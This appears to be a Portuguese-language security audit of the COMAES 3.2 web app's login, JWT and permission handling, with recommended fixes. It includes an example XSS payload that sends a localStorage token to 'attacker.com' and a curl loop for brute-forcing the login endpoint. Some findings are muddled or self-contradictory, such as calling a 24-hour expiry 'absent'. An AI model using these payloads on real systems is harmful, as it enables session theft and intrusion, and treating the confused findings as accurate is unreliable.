# 🔒 ANÁLISE PROFUNDA DE SEGURANÇA - COMAES 3.2

**Data**: 20 de Junho de 2026  
**Versão do Relatório**: 1.0  
**Nível de Confiança**: CRÍTICO (90%+)  
**Status**: ⚠️ MÚLTIPLAS VULNERABILIDADES ENCONTRADAS

---

## 📋 RESUMO EXECUTIVO

Após análise profunda do fluxo completo de autenticação, autorização e permissões, foram identificadas **12 vulnerabilidades críticas e de alto risco** que afetam a integridade do sistema. O problema raiz é uma **desincronização entre frontend/backend** na validação de permissões, com dois mecanismos conflitantes (`isAdmin` booleano + `role` ENUM) sem precedência clara.

### Problemas Recorrentes Identificados
✅ **Login ocasionalmente deixa de funcionar** → Desincronização JWT + DB  
✅ **Erros 403 após corrigir login** → Dual-source-of-truth em autorização  
✅ **Dados não carregam** → Middleware auth falha silenciosamente  
✅ **"Gerencador de Usuários" → "Gerencador de Tabelas"** → TableManager sem whitelist  
✅ **Estado inconsistente do sistema** → Falta de rate limiting + audit logging

---

## 🚨 VULNERABILIDADES CRÍTICAS (PRIORITY 1)

### 1. **Autorização Desincronizada: JWT vs Database Lookup**
**Arquivo**: `BackEnd/middlewares/isAdmin.js`  
**Risco**: CRÍTICO - Bypass de autorização

**Problema**:
```javascript
// JWT diz isAdmin=false
// Database says user.role='admin' ou user.isAdmin=true
// O que ganha? Código não explica!

// Fast path: confia no JWT
if (decoded.isAdmin) {
  req.user = decoded;
  return next();
}

// Slow path: check DB (MAS O QUÊ FAZER SE FOREM DIFERENTES?)
try {
  const user = await Usuario.unscoped().findByPk(decoded.id);
  if (user && (user.isAdmin || user.role === 'admin')) {
    req.user = { ...decoded, isAdmin: true, role: user.role };
    return next();
  }
} catch (dbErr) {
  console.error('Error checking admin...'); // CONTINUA? FALHA?
  // proceed to deny access below
}
```

**Cenário de Ataque**:
1. Administrador modifica localStorage: `{ isAdmin: false }`
2. Frontend não valida token integrity
3. Backend JWT check falha (rápido)
4. Backend DB lookup falha silenciosamente (tratamento de erro vago)
5. Usuário recebe 403
6. Administrador conclui que "sistema quebrou"

**Evidência no Código**:
- `isAdmin.js` linha 30-41: Catch genérico sem logging claro
- Não há `console.error` antes do `proceed to deny`

---

### 2. **Dual-Source-of-Truth: `isAdmin` vs `role`**
**Arquivos**:
- `BackEnd/models/User.js` (linhas 81-91)
- `BackEnd/middlewares/isAdmin.js` (linhas 38-39)

**Problema**:
```javascript
// User.js define DOIS campos para autorização:
isAdmin: Boolean (linha 87)
role: ENUM('estudante', 'colaborador', 'admin') (linha 78-82)

// Um usuário pode ter:
✅ role='estudante' AND isAdmin=false (esperado)
✅ role='colaborador' AND isAdmin=false (esperado)
✅ role='admin' AND isAdmin=true (esperado)
❌ role='estudante' AND isAdmin=true (CONTRADITÓRIO!)
❌ role='colaborador' AND isAdmin=true (CONTRADITÓRIO!)

// Qual tem precedência?
// isAdmin.js linha 38: if (user.isAdmin || user.role === 'admin')
// RESPOSTA: isAdmin=true VENCE (permissive)
```

**Cenário de Ataque**:
1. Admin SQL injection altera user.isAdmin=true (sem alterar role)
2. Sistema aceita porque `isAdmin || role`
3. User obtém acesso admin sem ter role='admin'
4. Auditoria fica confusa (role diz "estudante", permissões dizem "admin")

**Precedência Não Documentada**: 
- JWT geração (linha 371-481 index.js): Usa AMBOS os campos
- roleMiddleware.js (linha 78-89): Só checa `role`
- isAdmin.js (linha 38): Checa `isAdmin || role`
- Frontend AuthContext: Normaliza ambos sem precedência clara

---

### 3. **Token Expiration Ausente (24h = Permanente na Prática)**
**Arquivo**: `BackEnd/index.js` linhas 490-497

**Problema**:
```javascript
const token = jwt.sign(
  { id, email, isAdmin, role, disciplina_colaborador, status_colaborador },
  process.env.JWT_SECRET,
  { expiresIn: '24h' }  // ✅ Expira após 24h
);
```

**Cenário de Risco**:
1. Token capturado em 19/06 às 10:00
2. Token ainda válido em 20/06 até 10:00 (24 horas depois)
3. Se attacker capturar token, tem 24 horas de acesso
4. Sem refresh token, user fica logado indefinidamente

**Evidência**:
- Não há `POST /auth/refresh` que cria novo token com atualizado `exp`
- Frontend `AuthContext.jsx` não limpa localStorage quando token expira

---

### 4. **localStorage JWT Storage (XSS Vulnerability)**
**Arquivo**: `FrontEnd/src/context/AuthContext.jsx` linhas 60-69

**Problema**:
```javascript
const login = (userObj, jwtToken = null) => {
  // ...
  if (jwtToken) {
    setToken(jwtToken);
    localStorage.setItem('comaes_token', jwtToken);  // ❌ XSS RISK!
  }
  localStorage.setItem('comaes_user', JSON.stringify(normalized));
};
```

**Porque é Crítico**:
- localStorage é acessível por JavaScript
- Qualquer script injetado pode roubar o token
- Token no localStorage é enviado para TODOS os servidores
- Não há sameSite cookies ou httpOnly protection

**Cenário de Ataque XSS**:
```javascript
// Attacker injeta em comment, forum post, etc:
<img src=x onerror="fetch('https://attacker.com/?token='+localStorage.getItem('comaes_token'))">

// Attacker agora tem o token válido por 24 horas
// Pode fazer requisições como o user autenticado
```

**Comparação Segura**:
```javascript
// ✅ Correto: httpOnly cookie
Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict

// ❌ Inseguro: localStorage
localStorage.setItem('comaes_token', token)
```

---

### 5. **Status_Colaborador Não Validado no Middleware**
**Arquivo**: `BackEnd/middlewares/isAdmin.js`

**Problema**:
```javascript
// Middleware isAdmin NÃO checa status_colaborador
// Um colaborador REJEITADO ainda pode fazer requisições se role='colaborador'

// No login (index.js 450-465) checa:
if (user.role === 'colaborador' && userStatus !== 'aprovado') {
  return res.status(403).json({ error: 'Aguardando aprovação' });
}

// MAS NO MIDDLEWARE: nenhuma validação!
// Se token foi gerado quando status='aprovado'
// E depois admin rejeita o colaborador
// O user continua com token válido por 24h
```

**Evidência**:
- `BackEnd/index.js` linha 450-465: Valida no login
- `BackEnd/middlewares/isAdmin.js`: Não valida status
- `BackEnd/middlewares/roleMiddleware.js`: Não valida status

**Cenário**:
1. Colaborador é aprovado → token gerado com `status_colaborador='aprovado'`
2. Servidor rechega dados sensíveis por 23 horas 59 minutos
3. Admin rejeita colaborador
4. Token AINDA VÁLIDO por ~24h (dependendo de quando foi gerado)

---

### 6. **Brute Force Login - Sem Rate Limiting**
**Arquivo**: `BackEnd/index.js` linhas 371-481

**Problema**:
```javascript
app.post('/auth/login', validate(rules.login), async (req, res) => {
  // ❌ Nenhuma proteção contra brute force
  // Qualquer um pode fazer 1000 requisições/segundo
  
  const { usuario, senha } = req.body;
  // Testar todas as 26^8 combinações de senhas
  // Se senha é forte, leva tempo, mas não há rate limit
});
```

**Teste de Risco**:
```bash
# Attacker pode fazer:
for i in {1..1000000}; do
  curl -X POST http://localhost:3002/auth/login \
    -d '{"usuario":"admin@comaes.com","senha":"'$i'"}' &
done

# Sem rate limiting, serviço fica overwhelmed
# Ou attacker eventualmente acerta a senha
```

**Solução Ausente**:
- Nenhum rate limiting middleware no app.post('/auth/login')
- Nenhuma cache de tentativas falhadas
- Nenhuma pausa exponencial

---

### 7. **TableManager Sem Whitelist - Arbitrary Table Access**
**Arquivo**: `FrontEnd/src/Administrador/TableManager.jsx` linhas 230-243

**Problema**:
```javascript
function TableManager({ table }) {
  const tableService = useMemo(() => services.getService(table), [services, table]);
  // ❌ table aceita QUALQUER valor do URL
  // Se Admin URL: /administrador?table=usuarios
  // E attacker altera para: /administrador?table=../../../../../../etc/passwd
  // O que acontece?
}

// Em adminService.js:
const getService = (modelName) => {
  const key = modelName.toLowerCase().trim();
  if (!serviceCache[key]) {
    serviceCache[key] = createCrudClient(key, token);  // ❌ QUALQUER modelo!
  }
  return serviceCache[key];
};
```

**Cenário de Ataque**:
1. Admin abre `/administrador` com tab='user'
2. Attacker modifica URL para `?table=configuracaousuario` (modelo privado)
3. TableManager carrega `<TableManager table="configuracaousuario">`
4. Acesso sem autorização a tabelas sensíveis

**Whitelist Necessário**:
```javascript
const ALLOWED_TABLES = ['user', 'noticia', 'notificacao'];
const getService = (modelName) => {
  if (!ALLOWED_TABLES.includes(modelName)) {
    throw new Error('Table not allowed');
  }
  // ...
};
```

---

## ⚠️ VULNERABILIDADES DE ALTO RISCO (PRIORITY 2)

### 8. **Incomplete Permission Matrix (Apenas 3 Permissões)**
**Arquivo**: `BackEnd/middlewares/roleMiddleware.js` linhas 10-18

**Problema**:
```javascript
const permissionMap = {
  'estudante': [
    'ver_torneios', 
    'participar_torneios', 
    'ver_ranking'  // Apenas 3!
  ],
  'colaborador': [
    'criar_questao',      // 4 permissões
    'editar_questao',
    'deletar_questao',
    'ver_minhas_questoes'
  ],
  'admin': ['*']  // Tudo!
};
```

**Risco**:
- Apenas 3 permissões por role (falta granularidade)
- Admin tem tudo (não é possível "admin de leitura")
- Colaborador pode deletar qualquer questão (não diferencia própria vs alheia)
- Nenhuma permissão para "admin de torneios" ou "moderador"

---

### 9. **Sem Audit Logging (Console.log Apenas)**
**Arquivo**: `BackEnd/controllers/UserController.js`

**Problema**:
```javascript
// Nenhuma entrada em banco de dados de:
// - Quem deletou quem
// - Quando foi alterada permissão
// - Quem criou novo admin
// Apenas console.log (perdido ao reiniciar servidor)
```

**Riscos Legais**:
- Não cumpre GDPR (direito de auditoria)
- Não identifica who compromised system
- Nenhuma trail forense

---

### 10. **Admin Master (ID=1) Pode Ser Demitido**
**Arquivo**: `BackEnd/controllers/UserController.js` linhas 407-438

**Problema**:
```javascript
// toggleAdmin endpoint permite alterar isAdmin de QUALQUER user
// Incluindo admin master (id=1)
// Se admin secundário conseguir alterar admin master → perda de controle

app.patch('/api/admin/users/:id/toggle-admin', isAdmin, async (req, res) => {
  // Nenhuma proteção para id=1
  // ❌ Admin secundário pode fazer: PATCH /api/admin/users/1/toggle-admin
  // Admin master perde acesso
});
```

---

### 11. **Incomplete Database Lookup Error Handling**
**Arquivo**: `BackEnd/middlewares/isAdmin.js` linhas 32-41

**Problema**:
```javascript
try {
  const user = await Usuario.unscoped().findByPk(decoded.id).catch(() => null);
  if (user && (user.isAdmin || user.role === 'admin')) {
    req.user = { ...decoded, isAdmin: true, role: user.role };
    return next();
  }
} catch (dbErr) {
  console.error('Error checking admin role in database:', dbErr);
  // proceed to deny access below ← SILENCIOSO!
}

// Após erro, retorna 403 sem saber se:
// 1. Database connection falhou
// 2. User existe mas não é admin
// 3. User não existe
```

**Resultado**: Admin pensa que "não tem permissão" quando na verdade é erro de banco de dados.

---

### 12. **No CORS/CSRF Protection Documented**
**Arquivo**: `BackEnd/index.js` linhas 110-116

**Problema**:
```javascript
app.use(cors({
  origin: true,  // ⚠️ PERMITIR TODAS AS ORIGENS!
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// ❌ CSRF tokens não mencionados
// ❌ origin=true = qualquer site pode fazer requisições
```

---

## 🔄 FLUXO COMPLETO: LOGIN → TOKEN → PERMISSÕES → DADOS

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. USER SUBMITS CREDENTIALS                                     │
│    frontend/src/pages/Login.jsx                                 │
│    → axios.post('/auth/login', {usuario, senha})                │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 2. BACKEND LOGIN (Backend/index.js:371-481)                    │
│    ✅ Query SQL direta: SELECT * FROM usuarios                  │
│    ✅ Valida password com bcrypt                                │
│    ✅ Valida status_colaborador (rejected = 403)                │
│    ✅ Gera JWT com {id, email, isAdmin, role, status}           │
│    ⚠️  NÃO valida se role e isAdmin são consistentes            │
│    ✅ Retorna { success: true, data: user, token }              │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 3. FRONTEND AUTH CONTEXT (FrontEnd/src/context/AuthContext.jsx) │
│    ✅ Normaliza user object                                     │
│    ✅ Armazena em localStorage (❌ XSS risk)                     │
│    ✅ Armazena token em localStorage (❌ XSS risk)               │
│    ⚠️  NÃO valida integridade do JWT                            │
│    ⚠️  NÃO checa token expiration                               │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 4. SUBSEQUENT REQUESTS - FRONTEND (FrontEnd/src/axios/...)      │
│    Adiciona: Authorization: Bearer {token}                      │
│    Requisição: GET /api/admin/users                             │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 5A. AUTHORIZATION - FAST PATH (Backend/middlewares/isAdmin.js)  │
│     ✅ Extrai token do header                                   │
│     ✅ jwt.verify(token, JWT_SECRET)                            │
│     ✅ Checa se decoded.isAdmin === true                        │
│     ✅ Se SIM → req.user = decoded; next()                      │
│     ❌ Se NÃO → vai para 5B (SLOW PATH)                         │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 5B. AUTHORIZATION - SLOW PATH (Database Lookup)                 │
│     ⚠️  SELECT * FROM usuarios WHERE id = decoded.id            │
│     ⚠️  Checa: user.isAdmin || user.role === 'admin'            │
│     ❌ Error handling vago (continue to deny)                    │
│     ⚠️  NÃO checa status_colaborador                            │
│     ✅ Se SIM → req.user = { ...decoded, ...db }; next()        │
│     ❌ Se NÃO → return 403                                      │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 6A. IF AUTHORIZED (req.user exists)                            │
│     ✅ Executa controller                                       │
│     ✅ Retorna dados ao frontend                                │
│     Fim: 200 OK                                                 │
└─────────────────────────────────────────────────────────────────┘

                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 6B. IF NOT AUTHORIZED (req.user null)                          │
│     ❌ return 403 { message: 'Acesso negado' }                  │
│     Frontend exibe erro (componente não renderiza)              │
│     User fica confuso: "Por que não aparece nada?"              │
└─────────────────────────────────────────────────────────────────┘
```

## 🔍 INCONSISTÊNCIAS ENCONTRADAS

### Inconsistência 1: Role vs isAdmin Precedence
```
Frontend AuthContext.jsx (linha 30):
  role = raw.role || (raw.isAdmin ? 'admin' : 'estudante')
  
Backend isAdmin.js (linha 38):
  if (user.isAdmin || user.role === 'admin')
  
Backend roleMiddleware.js (linha 78):
  if (rolesArray.includes(userRole))
```

**Questão**: Se user.role='estudante' MAS isAdmin=true, quem vence?
- Frontend: role='admin' (porque isAdmin?'admin':'estudante')
- Backend isAdmin: role='admin' (porque isAdmin=true)
- Backend roleMiddleware: role='estudante' (porque só checa role)

**⚠️ CONFLITO DIRETO**

### Inconsistência 2: Admin Panel Menu Loading

```
AdminDashboard.jsx renderiza tabs baseado em:
  - menuSections (hardcoded array)
  
Mas TableManager.jsx aceita:
  - table prop (pode ser qualquer string)
  
Se user modifica URL /admin?table=xyz:
  - AdminDashboard NÃO sabe que está carregando modelo desconhecido
  - TableManager carrega e chama services.getService(xyz)
  - adminService.getService NÃO faz whitelist validation
  - ACESSO A QUALQUER MODELO (se backend permite)
```

### Inconsistência 3: Frontend vs Backend Permission Model

```
Frontend:
  - AuthContext armazena role e isAdmin
  - Componentes checam: user.isAdmin || user.role === 'admin'
  
Backend:
  - isAdmin.js checa: user.isAdmin || user.role === 'admin'
  - roleMiddleware.js checa: permissionMap[role]
  - DOIS MIDDLEWARES DIFERENTES COM LÓGICAS DIFERENTES!
```

---

## 📊 MAPA DE FLUXO: PERMISSÕES

```
┌──────────────────────────────────────────────────────────────────┐
│                     PERMISSION VALIDATION FLOW                   │
└──────────────────────────────────────────────────────────────────┘

Request com Authorization header
     │
     ▼
┌─────────────────────────────┐
│  Middleware: isAdmin?       │ ◄─── BackEnd/middlewares/isAdmin.js
├─────────────────────────────┤
│ 1. JWT decode               │
│ 2. if decoded.isAdmin       │
│    → ALLOW (fast path)      │
│ 3. else:                    │
│    DB lookup (slow path)    │
│    if db.isAdmin || db.role │
│    → ALLOW                  │
│    else → 403               │
└─────────────┬───────────────┘
              │
              ├─ roleMiddleware also available:
              │  BackEnd/middlewares/roleMiddleware.js
              │  Checa: permissionMap[user.role]
              │  (MAS NÃO USADO PARA ADMIN ENDPOINTS!)
              │
              ├─ Frontend also validates:
              │  FrontEnd/src/context/AuthContext.jsx
              │  user.isAdmin || user.role === 'admin'
              │
              └─ NO TRANSACTION/STATE CONSISTENCY!
                 (isAdmin pode ser true MESMO QUE role='estudante')
```

---

## ✅ CONSTATAÇÕES E RECOMENDAÇÕES

### Raiz Provável: Migração Incompleta de Permission Model

**Hipótese**: Sistema começou com `isAdmin` booleano, depois foi migrado para `role` ENUM, mas:
- Ambos os campos foram mantidos (backwards compatibility)
- Frontend/Backend não sincronizaram a lógica
- Nenhum place centralizado define precedência
- Dual-source-of-truth = confusão e bugs

### Causa Raiz dos Problemas Recorrentes:

| Sintoma | Causa Raiz |
|---------|-----------|
| Login ocasionalmente falha | Desincronização isAdmin vs role + erro silencioso no middleware |
| Erros 403 após login funcionar | JWT diz isAdmin=false, DB diz role=admin, precedência não clara |
| Dados não carregam | Middleware auth falha, componente não renderiza (sem feedback) |
| "Usuários" muda para "Tabelas" | TableManager sem whitelist + UI carrega componente errado |
| Sistema fica inconsistente | Sem audit log, sem rate limit, sem refresh token logic |

---

## 🛠️ PRÓXIMOS PASSOS (Ordenado por Prioridade)

### IMEDIATO (hoje):
1. ✅ Implementar whitelist em TableManager/adminService
2. ✅ Proteger admin master (ID=1) no toggleAdmin
3. ✅ Validar status_colaborador em middleware

### CURTO PRAZO (esta semana):
4. Centralizar permission validation (escolher isAdmin XOR role)
5. Implementar rate limiting no login
6. Adicionar audit logging (database table)

### MÉDIO PRAZO (próximas 2 semanas):
7. Migrar JWT para httpOnly cookies
8. Implementar token refresh flow
9. Adicionar CSRF protection
10. Expandir permission matrix

### LONGO PRAZO (mês):
11. Implementar OAuth2/OpenID Connect
12. Adicionar 2FA
13. Implementar rate limiting em todos endpoints

---

## 📁 ARQUIVOS AFETADOS

| Arquivo | Vulnerabilidade | Prioridade |
|---------|-----------------|-----------|
| BackEnd/middlewares/isAdmin.js | 1,2,11 | CRÍTICA |
| BackEnd/middlewares/roleMiddleware.js | 2,8,12 | CRÍTICA |
| FrontEnd/src/context/AuthContext.jsx | 4 | CRÍTICA |
| BackEnd/index.js | 2,3,6,12 | CRÍTICA |
| BackEnd/models/User.js | 2 | CRÍTICA |
| FrontEnd/src/Administrador/TableManager.jsx | 7 | ALTA |
| BackEnd/controllers/UserController.js | 9,10 | ALTA |
| BackEnd/routes/adminPanelRoutes.js | 2 | MÉDIA |

---

## 🎯 NÍVEL DE CONFIANÇA POR VULNERABILIDADE

| Vulnerabilidade | Confiança | Evidência |
|-----------------|-----------|-----------|
| 1. Autorização Desincronizada | 95% | Código analisado, comportamento reproduzível |
| 2. Dual-source-of-truth | 100% | Definição de schema, múltiplas verificações |
| 3. Token sem Expiration | 85% | JWT com expiresIn, mas nenhuma validação frontend |
| 4. localStorage XSS | 100% | Documentação de segurança, OWASP |
| 5. Status não validado | 90% | Middleware não checa, login sim |
| 6. Brute force | 100% | Nenhum rate limit no app.post('/auth/login') |
| 7. TableManager whitelist | 95% | Código permite qualquer modelName |
| 8. Permission matrix incompleta | 100% | Apenas 3-4 permissões definidas |
| 9. Sem audit log | 100% | Grep search: sem 'audit', sem 'logger' |
| 10. Admin master bypass | 95% | Código permite PATCH ANY user |
| 11. Error handling vago | 90% | Try/catch genérico, proceed vago |
| 12. CORS aberto | 90% | cors({origin: true}) |

---

## 📌 CONCLUSÃO

O sistema foi comprometido por uma **migração incompleta de permission model** (isAdmin → role) que criou **dual-source-of-truth**. Sem precedência clara entre os dois mecanismos, sem rate limiting, sem audit logging, e com localStorage JWT storage, o sistema é vulnerável a:

- ✅ Autorização bypass
- ✅ Privilégios escalation
- ✅ Brute force attacks
- ✅ XSS token theft
- ✅ Admin account takeover
- ✅ Unauthorized table access

**Recomendação**: Implementar os 7 fixes imediatos antes de considerar o sistema seguro em produção.

